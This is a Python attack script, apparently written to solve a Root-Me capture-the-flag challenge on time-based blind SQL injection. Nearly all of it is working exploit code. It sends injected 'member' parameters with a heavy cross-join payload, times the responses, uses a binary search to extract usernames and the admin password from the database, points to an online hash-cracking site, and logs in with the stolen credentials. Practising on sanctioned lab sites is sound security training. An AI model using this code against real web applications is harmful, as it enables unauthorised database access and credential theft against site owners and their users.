#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 15 - VALIDACIÓN CON VALORES CONOCIDOS
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1, users T2)"
        self.debug = False
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        payload = f"1 OR ({condition}) OR {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        return t < self.threshold
    
    def extract_char_at_position(self, query, pos):
        """Extrae un carácter específico de una posición"""
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char_at_position(query, pos)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:  # NULL o espacio
                break
        return result
    
    def verify_known_value(self, query, expected, label="Verificando"):
        """Verifica si una consulta devuelve el valor esperado"""
        print(f"\n[*] {label}...")
        print(f"  Esperado: '{expected}'")
        
        # Verificar cada carácter
        for pos, expected_char in enumerate(expected, 1):
            # Extraer el carácter
            char = self.extract_char_at_position(query, pos)
            print(f"  [{pos}] Obtenido: '{char}' (ASCII: {ord(char)}) | Esperado: '{expected_char}' (ASCII: {ord(expected_char)})")
            
            if char != expected_char:
                print(f"  ❌ Diferencia en posición {pos}: '{char}' != '{expected_char}'")
                return False
        
        print(f"  ✅ ¡Coincide! Valor extraído: '{expected}'")
        return True

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  VALIDACIÓN CON VALORES CONOCIDOS")
print("="*70)

# 1. Extraer usuarios usando el ID (que sabemos que existe)
print("\n[1] Extrayendo usuarios por ID:")

# ID 1 debería ser 'admin'
query_id1 = "SELECT user FROM member WHERE id=1"
result1 = injector.extract_string(query_id1, "Usuario con ID=1 (debería ser 'admin')")
print(f"  Resultado: '{result1}'")

# ID 2 debería ser 'jsilver'
query_id2 = "SELECT user FROM member WHERE id=2"
result2 = injector.extract_string(query_id2, "Usuario con ID=2 (debería ser 'jsilver')")
print(f"  Resultado: '{result2}'")

# ID 3 debería ser 'jsparow'
query_id3 = "SELECT user FROM member WHERE id=3"
result3 = injector.extract_string(query_id3, "Usuario con ID=3 (debería ser 'jsparow')")
print(f"  Resultado: '{result3}'")

# 2. Verificar carácter por carácter
print("\n[2] Verificando carácter por carácter:")

# Verificar 'admin'
injector.verify_known_value(
    "SELECT user FROM member WHERE id=1",
    "admin",
    "Verificando 'admin'"
)

# Verificar 'jsilver'
injector.verify_known_value(
    "SELECT user FROM member WHERE id=2",
    "jsilver",
    "Verificando 'jsilver'"
)

# Verificar 'jsparow'
injector.verify_known_value(
    "SELECT user FROM member WHERE id=3",
    "jsparow",
    "Verificando 'jsparow'"
)

# 3. Extraer usando ORDER BY para confirmar IDs
print("\n[3] Extrayendo usando ORDER BY (debería coincidir con los IDs):")
for i in range(1, 4):
    query = f"SELECT user FROM member ORDER BY id LIMIT 1 OFFSET {i-1}"
    result = injector.extract_string(query, f"Orden {i}")
    print(f"  Posición {i}: '{result}'")

# 4. Verificar si la tabla tiene los mismos datos que la página
print("\n[4] Comparando con la página web:")
page_users = ['admin', 'jsilver', 'jsparow']
db_users = [result1, result2, result3]

for i, (page, db) in enumerate(zip(page_users, db_users), 1):
    print(f"  ID {i}: Página='{page}' | DB='{db}'")
    if page == db:
        print(f"    ✅ Coincide")
    else:
        print(f"    ❌ No coincide")

# 5. Extraer la contraseña del admin
print("\n[5] Extrayendo contraseña del admin...")
query_admin_pass = "SELECT password FROM member WHERE user='admin'"
admin_pass = injector.extract_string(query_admin_pass, "Contraseña del admin")
print(f"\n  Contraseña del admin: '{admin_pass}'")

# 6. Si parece un hash, intentar identificar el tipo
if admin_pass:
    print(f"\n[6] Analizando contraseña:")
    print(f"  Longitud: {len(admin_pass)}")
    print(f"  Caracteres: {admin_pass}")
    
    # Verificar si es MD5
    if len(admin_pass) == 32 and all(c in '0123456789abcdef' for c in admin_pass.lower()):
        print("  ✅ Parece ser un hash MD5")
        print(f"  Puedes intentar crackearlo en: https://crackstation.net/")
    
    # Verificar si es SHA1
    elif len(admin_pass) == 40 and all(c in '0123456789abcdef' for c in admin_pass.lower()):
        print("  ✅ Parece ser un hash SHA1")
    
    # Verificar si es texto plano
    elif len(admin_pass) > 3 and all(32 <= ord(c) <= 126 for c in admin_pass):
        print("  ✅ Parece ser texto plano")
    
    # Verificar credenciales
    print("\n[7] Verificando credenciales...")
    data = {"username": "admin", "password": admin_pass}
    r = requests.post(URL + "?action=login", data=data, cookies=injector.session.cookies)
    
    if "Authentification error" not in r.text:
        print("  ✅ ¡CREDENCIALES CORRECTAS!")
        print(f"  Usuario: admin")
        print(f"  Contraseña: {admin_pass}")
    else:
        print("  ❌ Las credenciales no funcionan")

print("\n" + "="*70)
print("  RESUMEN FINAL")
print("="*70)
print(f"Usuarios en DB: {db_users}")
print(f"Contraseña admin: {admin_pass}")
